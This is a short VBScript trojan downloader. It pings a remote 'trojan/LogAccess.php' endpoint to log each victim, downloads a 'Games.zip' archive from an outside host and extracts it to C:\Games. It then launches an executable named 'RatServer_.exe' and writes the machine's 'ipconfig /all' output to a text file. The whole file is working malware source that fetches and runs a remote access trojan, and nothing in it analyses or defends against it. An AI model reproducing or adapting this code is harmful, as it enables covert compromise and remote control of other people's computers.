
' Set your settings
    strFileURL = "http://twitt.esy.es/Games.zip"
    strHDLocation = "C:\Games\Games.zip"
	strFolder = "C:\Games\"
	strExtractFolder = "C:\Games\"
	strFileExec = "C:\Games\RatServer_.exe"
	strRegisterAccess = "http://twitt.esy.es/trojan/LogAccess.php"

'1. Access to server to mark IpInfo
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", strRegisterAccess, false
objXMLHTTP.send()

'2. Access to download all files
Dim oFSO
Dim objshell

Set oFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("Shell.Application") 

If Not oFSO.folderExists(strFolder) Then
	oFSO.CreateFolder strFolder
End If

' Fetch the file
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")

objXMLHTTP.open "GET", strFileURL, false
objXMLHTTP.send()

If objXMLHTTP.Status = 200 Then
	Set objADOStream = CreateObject("ADODB.Stream")
	objADOStream.Open
	objADOStream.Type = 1 'adTypeBinary

	objADOStream.Write objXMLHTTP.ResponseBody
	objADOStream.Position = 0    'Set the stream position to the start

	Set objFSO = Createobject("Scripting.FileSystemObject")
	If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
		Set objFSO = Nothing

	objADOStream.SaveToFile strHDLocation
	objADOStream.Close
	
	Set objADOStream = Nothing
End if

Set objXMLHTTP = Nothing

'3. Extract all zip files

Set fso = CreateObject("Scripting.FileSystemObject")
If NOT fso.FolderExists(strExtractFolder) Then
   fso.CreateFolder(strExtractFolder)
End If

set FilesInZip=objShell.NameSpace(strHDLocation).items
objShell.NameSpace(strExtractFolder).CopyHere(FilesInZip)

Set objShell = Nothing

Set oShell = CreateObject("Shell.Application")
oShell.ShellExecute strFileExec

'4. Run script
Set WshShell=CreateObject("WScript.Shell")
WshShell.run "cmd /c ipconfig /all > C:\Games\IpInfo.txt"
